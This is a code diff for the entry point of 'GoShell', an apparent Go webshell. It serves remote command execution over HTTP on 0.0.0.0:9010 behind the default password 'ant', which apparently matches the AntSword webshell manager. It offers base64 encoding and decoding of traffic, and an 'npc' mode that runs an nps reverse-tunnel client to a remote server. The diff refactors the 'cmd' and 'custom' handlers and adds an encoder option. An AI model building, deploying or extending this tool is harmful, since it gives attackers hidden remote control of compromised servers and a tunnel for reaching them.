@@ -4,16 +4,19 @@ import (
 	"flag"
 	"net/http"
 
+	"github.com/Wd0g/GoShell/lib/coder"
+
 	"github.com/Wd0g/GoShell/lib/server"
 
 	"ehang.io/nps/client"
 )
 
 var (
-	mode       = flag.String("m", "cmd", "[cmd, custom, npc]")
+	mode       = flag.String("m", "custom", "[custom, cmd, npc]")
 	webAddr    = flag.String("web-addr", "0.0.0.0:9010", "")
 	webPwd     = flag.String("web-pwd", "ant", "")
 	webDecoder = flag.String("web-decoder", "plain", "[plain, base64]")
+	webEncoder = flag.String("web-encoder", "plain", "[plain, base64]")
 	npcServer  = flag.String("server", "", "")
 	npcVkey    = flag.String("vkey", "", "")
 	npcType    = flag.String("type", "", "")
@@ -21,24 +24,29 @@ var (
 
 func main() {
 	flag.Parse()
-
-	switch *mode {
-	case "npc":
+	if *mode == "npc" {
 		cli := client.NewRPClient(*npcServer, *npcVkey, *npcType, "", nil, 60)
 		cli.Start()
+		return
+	}
+
+	//var handler http.Handler
+	switch *mode {
 	case "cmd":
-		handler := server.Handler{
+		handler := server.Cmd{
 			Pwd:     *webPwd,
-			Decoder: *webDecoder,
-			Mode:    "cmd",
+			Decoder: coder.NewDecoder(*webDecoder),
+			Encoder: coder.NewEncoder(*webEncoder),
 		}
 		http.ListenAndServe(*webAddr, handler)
+
 	case "custom":
-		handler := server.Handler{
+		handler := server.Custom{
 			Pwd:     *webPwd,
-			Decoder: *webDecoder,
-			Mode:    "custom",
+			Decoder: coder.NewDecoder(*webDecoder),
+			Encoder: coder.NewEncoder(*webEncoder),
 		}
 		http.ListenAndServe(*webAddr, handler)
 	}
+
 }
